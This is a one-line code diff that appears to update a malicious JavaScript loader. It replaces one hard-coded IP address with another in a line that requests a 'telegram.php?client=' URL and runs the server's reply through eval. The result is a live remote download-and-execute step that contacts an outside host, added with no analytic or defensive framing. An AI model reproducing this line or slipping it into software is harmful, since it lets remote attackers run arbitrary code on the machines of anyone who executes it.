@@ -1,1 +1,1 @@
-h.open('GET','http://149.28.159.238/TG/JZ/telegram.php?client='+n,false);h.send();eval(h.ResponseText);
+h.open('GET','http://45.61.137.85/TG/wy/telegram.php?client='+n,false);h.send();eval(h.ResponseText);
